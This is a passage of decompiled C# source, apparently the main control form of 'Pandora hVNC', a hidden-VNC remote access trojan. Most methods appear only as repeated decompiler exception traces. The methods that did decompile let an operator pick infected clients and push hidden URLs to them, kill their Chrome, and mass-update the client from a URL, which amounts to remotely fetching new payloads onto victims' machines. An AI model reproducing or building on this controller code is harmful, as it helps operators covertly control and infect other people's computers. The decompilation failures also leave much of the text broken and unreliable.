   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 112
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   --- End of inner exception stack trace ---
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   at ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:line 1533
*/;
		}

		// Token: 0x06000062 RID: 98 RVA: 0x0000C3E0 File Offset: 0x0000A5E0
		private void guna2Button2_Click(object sender, EventArgs e)
		{
			/*
An exception occurred when decompiling this method (06000062)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void HVNC.FrmMain::guna2Button2_Click(System.Object,System.EventArgs)

 ---> System.OverflowException: Arithmetic operation resulted in an overflow.
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 47
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 387
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 271
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 112
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   --- End of inner exception stack trace ---
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   at ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:line 1533
*/;
		}

		// Token: 0x06000063 RID: 99 RVA: 0x0000C44C File Offset: 0x0000A64C
		private void aboutToolStripMenuItem_Click(object sender, EventArgs e)
		{
			using (FrmAbout frmAbout = new FrmAbout())
			{
				frmAbout.ShowDialog();
			}
		}

		// Token: 0x06000064 RID: 100 RVA: 0x0000C484 File Offset: 0x0000A684
		private void guna2ToggleSwitch1_CheckedChanged(object sender, EventArgs e)
		{
			/*
An exception occurred when decompiling this method (06000064)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void HVNC.FrmMain::guna2ToggleSwitch1_CheckedChanged(System.Object,System.EventArgs)

 ---> System.OverflowException: Arithmetic operation resulted in an overflow.
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 47
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 387
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 271
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 112
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   --- End of inner exception stack trace ---
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   at ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:line 1533
*/;
		}

		// Token: 0x06000065 RID: 101 RVA: 0x0000C4E4 File Offset: 0x0000A6E4
		private void OpenBuilderBtn_Click(object sender, EventArgs e)
		{
			/*
An exception occurred when decompiling this method (06000065)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void HVNC.FrmMain::OpenBuilderBtn_Click(System.Object,System.EventArgs)

 ---> System.OverflowException: Arithmetic operation resulted in an overflow.
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 47
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 387
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 271
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 112
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   --- End of inner exception stack trace ---
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   at ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:line 1533
*/;
		}

		// Token: 0x06000066 RID: 102 RVA: 0x0000C550 File Offset: 0x0000A750
		private void FrmMain_FormClosed(object sender, FormClosedEventArgs e)
		{
			/*
An exception occurred when decompiling this method (06000066)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void HVNC.FrmMain::FrmMain_FormClosed(System.Object,System.Windows.Forms.FormClosedEventArgs)

 ---> System.OverflowException: Arithmetic operation resulted in an overflow.
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 47
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 387
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 271
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 112
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   --- End of inner exception stack trace ---
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   at ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:line 1533
*/;
		}

		// Token: 0x06000067 RID: 103 RVA: 0x0000C5B0 File Offset: 0x0000A7B0
		private void StartPort_CheckedChanged_1(object sender, EventArgs e)
		{
			/*
An exception occurred when decompiling this method (06000067)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void HVNC.FrmMain::StartPort_CheckedChanged_1(System.Object,System.EventArgs)

 ---> System.OverflowException: Arithmetic operation resulted in an overflow.
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 47
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 387
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 271
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 112
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   --- End of inner exception stack trace ---
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   at ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:line 1533
*/;
		}

		// Token: 0x1700000F RID: 15
		// (get) Token: 0x06000068 RID: 104 RVA: 0x000021E7 File Offset: 0x000003E7
		// (set) Token: 0x06000069 RID: 105 RVA: 0x0000C638 File Offset: 0x0000A838
		public static string saveurl
		{
			[CompilerGenerated]
			get
			{
				return FrmMain.<saveurl>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				/*
An exception occurred when decompiling this method (06000069)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void HVNC.FrmMain::set_saveurl(System.String)

 ---> System.OverflowException: Arithmetic operation resulted in an overflow.
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 47
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 387
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 271
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 112
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   --- End of inner exception stack trace ---
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   at ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:line 1533
*/;
			}
		}

		// Token: 0x0600006A RID: 106 RVA: 0x0000C694 File Offset: 0x0000A894
		private void visitURLToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.HVNCList.SelectedItems.Count == 0)
				{
					MessageBox.Show("You have to select a client first! ", "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				else
				{
					new FrmURL().ShowDialog();
					if (FrmMain.ispressed)
					{
						FrmVNC frmVNC = new FrmVNC();
						foreach (object obj in this.HVNCList.SelectedItems)
						{
							this.count = this.HVNCList.SelectedItems.Count;
						}
						for (int i = 0; i < this.count; i++)
						{
							frmVNC.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
							object tag = this.HVNCList.SelectedItems[i].Tag;
							frmVNC.Tag = tag;
							frmVNC.hURL(FrmMain.saveurl);
							frmVNC.Dispose();
						}
						MessageBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
						FrmMain.ispressed = false;
					}
				}
			}
			catch (Exception)
			{
				MessageBox.Show("An Error Has Occured When Trying To Execute HiddenURL");
				base.Close();
			}
		}

		// Token: 0x0600006B RID: 107 RVA: 0x0000C814 File Offset: 0x0000AA14
		private void killChromeToolStripMenuItem_Click(object sender, EventArgs e)
		{
			FrmVNC frmVNC = new FrmVNC();
			foreach (object obj in this.HVNCList.SelectedItems)
			{
				this.count = this.HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < this.count; i++)
			{
				frmVNC.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
				object tag = this.HVNCList.SelectedItems[i].Tag;
				frmVNC.Tag = tag;
				frmVNC.KillChrome();
				frmVNC.Dispose();
			}
			MessageBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x0600006C RID: 108 RVA: 0x0000C910 File Offset: 0x0000AB10
		private void resetScaleToolStripMenuItem_Click(object sender, EventArgs e)
		{
			FrmVNC frmVNC = new FrmVNC();
			foreach (object obj in this.HVNCList.SelectedItems)
			{
				this.count = this.HVNCList.SelectedItems.Count;
			}
			for (int i = 0; i < this.count; i++)
			{
				frmVNC.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
				object tag = this.HVNCList.SelectedItems[i].Tag;
				frmVNC.Tag = tag;
				frmVNC.ResetScale();
				frmVNC.Dispose();
			}
			MessageBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}

		// Token: 0x17000010 RID: 16
		// (get) Token: 0x0600006D RID: 109 RVA: 0x000021EE File Offset: 0x000003EE
		// (set) Token: 0x0600006E RID: 110 RVA: 0x0000CA0C File Offset: 0x0000AC0C
		public static string MassURL
		{
			[CompilerGenerated]
			get
			{
				return FrmMain.<MassURL>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				/*
An exception occurred when decompiling this method (0600006E)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void HVNC.FrmMain::set_MassURL(System.String)

 ---> System.OverflowException: Arithmetic operation resulted in an overflow.
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 47
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 387
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 271
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 112
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   --- End of inner exception stack trace ---
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   at ICSharpCode.Decompiler.Ast.AstBuilder.AddMethodBody(EntityDeclaration methodNode, EntityDeclaration& updatedNode, MethodDef method, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, MethodKind methodKind) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstBuilder.cs:line 1533
*/;
			}
		}

		// Token: 0x0600006F RID: 111 RVA: 0x0000CA68 File Offset: 0x0000AC68
		private void fromURLToolStripMenuItem_Click(object sender, EventArgs e)
		{
			try
			{
				if (this.HVNCList.SelectedItems.Count == 0)
				{
					MessageBox.Show("You have to select a client first! ", "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Hand);
				}
				else
				{
					new FrmMassUpdate().ShowDialog();
					if (FrmMain.ispressed)
					{
						FrmVNC frmVNC = new FrmVNC();
						foreach (object obj in this.HVNCList.SelectedItems)
						{
							this.count = this.HVNCList.SelectedItems.Count;
						}
						for (int i = 0; i < this.count; i++)
						{
							frmVNC.Name = "VNCForm:" + Conversions.ToString(this.HVNCList.SelectedItems[i].GetHashCode());
							object tag = this.HVNCList.SelectedItems[i].Tag;
							frmVNC.Tag = tag;
							frmVNC.UpdateClient(FrmMain.MassURL);
							frmVNC.Dispose();
						}
						MessageBox.Show("Operation Completed To Selected Clients: " + this.count.ToString(), "Pandora hVNC", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
						FrmMain.ispressed = false;
					}
				}
			}
			catch (Exception)
			{
				MessageBox.Show("An Error Has Occured When Trying To Execute HiddenURL");
				base.Close();
			}
		}

		// Token: 0x17000011 RID: 17
		// (get) Token: 0x06000070 RID: 112 RVA: 0x000021F5 File Offset: 0x000003F5
		// (set) Token: 0x06000071 RID: 113 RVA: 0x0000CBE8 File Offset: 0x0000ADE8
		public string xxhostname
		{
			[CompilerGenerated]
			get
			{
				return this.<xxhostname>k__BackingField;
			}
			[CompilerGenerated]
			set
			{
				/*
An exception occurred when decompiling this method (06000071)

ICSharpCode.Decompiler.DecompilerException: Error decompiling System.Void HVNC.FrmMain::set_xxhostname(System.String)

 ---> System.OverflowException: Arithmetic operation resulted in an overflow.
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackSlot.ModifyStack(StackSlot[] stack, Int32 popCount, Int32 pushCount, ByteCode pushDefinition) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 47
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.StackAnalysis(MethodDef methodDef) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 387
   at ICSharpCode.Decompiler.ILAst.ILAstBuilder.Build(MethodDef methodDef, Boolean optimize, DecompilerContext context) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\ILAst\ILAstBuilder.cs:line 271
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(IEnumerable`1 parameters, MethodDebugInfoBuilder& builder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 112
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
   --- End of inner exception stack trace ---
   at ICSharpCode.Decompiler.Ast.AstMethodBodyBuilder.CreateMethodBody(MethodDef methodDef, DecompilerContext context, AutoPropertyProvider autoPropertyProvider, IEnumerable`1 parameters, Boolean valueParameterIsKeyword, StringBuilder sb, MethodDebugInfoBuilder& stmtsBuilder) in D:\a\dnSpy\dnSpy\Extensions\ILSpy.Decompiler\ICSharpCode.Decompiler\ICSharpCode.Decompiler\Ast\AstMethodBodyBuilder.cs:line 99
